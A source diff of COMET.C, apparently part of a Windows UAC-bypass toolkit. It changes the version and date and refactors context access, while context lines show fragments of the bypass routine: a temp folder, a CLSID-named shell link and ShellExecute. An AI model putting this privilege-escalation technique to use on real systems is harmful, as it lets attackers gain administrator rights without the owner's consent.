@@ -4,9 +4,9 @@
 *
 *  TITLE:       COMET.C
 *
-*  VERSION:     3.00
+*  VERSION:     3.11
 *
-*  DATE:        25 Aug 2018
+*  DATE:        23 Nov 2018
 *
 *  Comet method (c) BreakingMalware
 *  For description please visit original URL 
@@ -53,7 +53,7 @@ BOOL ucmCometMethod(
     SHELLEXECUTEINFO  shinfo;
 
 #ifndef _WIN64
-    if (g_ctx.IsWow64) {
+    if (g_ctx->IsWow64) {
         if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
             return FALSE;
     }
@@ -62,7 +62,7 @@ BOOL ucmCometMethod(
     do {
 
         RtlSecureZeroMemory(szCombinedPath, sizeof(szCombinedPath));
-        _strcpy(szCombinedPath, g_ctx.szTempDirectory);
+        _strcpy(szCombinedPath, g_ctx->szTempDirectory);
         _strcat(szCombinedPath, SOMEOTHERNAME);
         if (!CreateDirectory(szCombinedPath, NULL)) {//%temp%\Comet
             if (GetLastError() != ERROR_ALREADY_EXISTS)
@@ -120,7 +120,7 @@ BOOL ucmCometMethod(
                 if (SUCCEEDED(persistFile->lpVtbl->Save(persistFile, szLinkFile, TRUE))) {
                     persistFile->lpVtbl->Release(persistFile);
 
-                    _strcpy(szCombinedPath, g_ctx.szTempDirectory);
+                    _strcpy(szCombinedPath, g_ctx->szTempDirectory);
                     _strcat(szCombinedPath, SOMEOTHERNAME);
                     _strcpy(szLinkFile, szCombinedPath);
                     _strcat(szLinkFile, T_CLSID_MYCOMPUTER_COMET);
@@ -148,7 +148,7 @@ BOOL ucmCometMethod(
     } while (bCond);
 
 #ifndef _WIN64
-    if (g_ctx.IsWow64) {
+    if (g_ctx->IsWow64) {
         RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
     }
 #endif
